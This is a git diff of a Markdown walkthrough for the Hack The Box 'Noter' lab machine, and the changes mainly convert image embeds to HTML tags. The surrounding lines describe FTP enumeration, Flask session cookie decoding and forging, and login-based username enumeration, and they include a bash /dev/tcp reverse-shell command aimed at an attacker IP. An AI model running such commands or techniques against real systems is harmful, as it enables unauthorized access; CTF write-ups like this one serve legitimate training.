@@ -54,12 +54,9 @@ Through searchsploit got only `Denial of Service` vulnerability on vsftpd 3.0.3
 
 ### Site
 
-
 <center>
-<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/1.png" style="width:40%">
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/1.png" >
 </center>
-
-![[LINUX/noter/assets/images/1.png]]
 
 ### Exploring the features
 
@@ -70,11 +67,15 @@ Through searchsploit got only `Denial of Service` vulnerability on vsftpd 3.0.3
 
 ### Registration
 
-![[LINUX/noter/assets/images/2.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/2.png" >
+</center>
 
 Once registration done, we can login through our credentials.
 
-![[3.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/3.png" >
+</center>
 
 After logging in, from the dashboard we can see add a note and upgrade to vip,
 
@@ -86,7 +87,9 @@ After logging in, from the dashboard we can see add a note and upgrade to vip,
 
 But there is a session with cookie running in the background after login,
 
-![[4.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/4.png" >
+</center>
 
 So, the cookie we found is `flask-session cookie` and decoding it we got 
 
@@ -99,13 +102,17 @@ So, the cookie we found is `flask-session cookie` and decoding it we got
 
 ### Bruteforcing the login part
 
-![[5.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/5.png" >
+</center>
 
 	username -> valid
 	password -> invalid
 	output -> Invalid login
 
-![[6.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/6.png" >
+</center>
 
 	username -> invalid
 	password -> invalid
@@ -168,9 +175,13 @@ eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxdnBQ.bg7BmShdAUJQCO_OVc3f1zbB
 
 ### Blue user
 
-![[7.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/7.png" >
+</center>
 
-![[8.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/8.png" >
+</center>
 
 ### Enumerating on ftp service
 
@@ -195,7 +206,9 @@ drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
 -rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
 ```
 
-![[9.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/9.png" >
+</center>
 
 Based on the password creation policy and `ftp_admin` account we can login as ftp_admin in ftp service.
 
@@ -223,11 +236,17 @@ ftp> ls
 
 ### Differentiating app.py files
 
-![[10.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/10.png" >
+</center>
 
-![[11.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/11.png" >
+</center>
 
-![[12.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/12.png" >
+</center>
 
 ### Exploiting the vulnerability
 
@@ -240,7 +259,9 @@ ftp> ls
 bash -i >& /dev/tcp/10.10.14.9/443 0>&1
 ```
 
-![[13.png]]
+<center>
+<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/13.png" >
+</center>
 
 ```shell
 svc@noter:/tmp$ ls
